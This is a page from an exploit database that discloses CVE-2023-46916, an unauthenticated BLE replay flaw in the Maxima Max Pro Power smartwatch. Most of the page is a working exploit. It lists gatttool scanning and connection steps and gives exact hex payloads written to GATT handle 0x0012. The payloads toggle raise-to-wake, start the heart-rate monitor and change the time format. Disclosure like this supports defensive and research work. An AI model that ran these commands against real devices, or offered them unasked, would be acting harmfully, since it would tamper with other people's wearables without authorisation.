---
title: Maxima Max Pro Power BLE Traffic Replay
url: https://cxsecurity.com/issue/WLB-2024030008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-03-07
fetch_date: 2025-10-06T17:08:10.036585
---

# Maxima Max Pro Power BLE Traffic Replay

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Maxima Max Pro Power BLE Traffic Replay**  **2024.03.06**  Credit:  **[Alok kumar](https://cxsecurity.com/author/Alok%2Bkumar%2B/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-46916](https://cxsecurity.com/cveshow/CVE-2023-46916/ "Click to see CVE-2023-46916")**  CWE: **[CWE-noinfo](https://cxsecurity.com/cwe/CWE-noinfo "CWE-noinfo")** | |

# Exploit Title: Maxima Max Pro Power - BLE Traffic Replay (Unauthenticated)
# Date: 13-Nov-2023
# Exploit Author: Alok kumar (alokkumar0200@gmail.com), Cyberpwn Technologies Pvt. Ltd.
# Vendor Homepage: https://www.maximawatches.com
# Product Link: https://www.maximawatches.com/products/max-pro-power
# Firmware Version: v1.0 486A
# Tested on: Maxima Max Pro Power
# CVE : CVE-2023-46916
# It was observed that an attacker can send crafted HEX values to “0x0012” GATT Charactristic handle on the watch to perform unauthorized actions like change Time display format, update Time, update notifications.
# And since, there is no integrity check for data received by the watch, an attacker can sniff the same value on smartwatch A, which later can be sent to smartwatch B leading unauthorized actions
# Scan for bluetooth LE devices nearby using any capable scanner, bluetoothctl is used in this “sudo bluetoothctl scan le”
# “sudo gattool -I” Starts gattool in interactive mode.
# “connect <MAC\_OF\_DEVICE\_FROM\_STEP\_1>” Connects to the specified BLE device.
# “char-desc” Lists all handles for the device.
# Run “mtu 247” in Gatttool after connection to set MTU for active connection.
# Run “char-read-hnd 0x0054” in Gatttool. Trust And Authorize the device on attacker's machine when prompted.
# "char-write-req 0x0012 ab00000e5422002202002b0009000000059fffffffff" disables Raise to wake feature.
# "char-write-req 0x0012 ab00000ec42f002302002b0009010000059fffffffff" enables Raise to wake feature.
# "char-write-req 0x0012 ab000009c2ee0034050023000400030501" starts Heart Rate monitor
# "char-write-req 0x0012 ab000007c323001902001800020002" sets Time Format to 24 Hrs on smartwatch.
# "char-write-req 0x0012 ab0000070022001802001800020006" sets Time Format to 12 Hrs on smartwatch.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024030008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top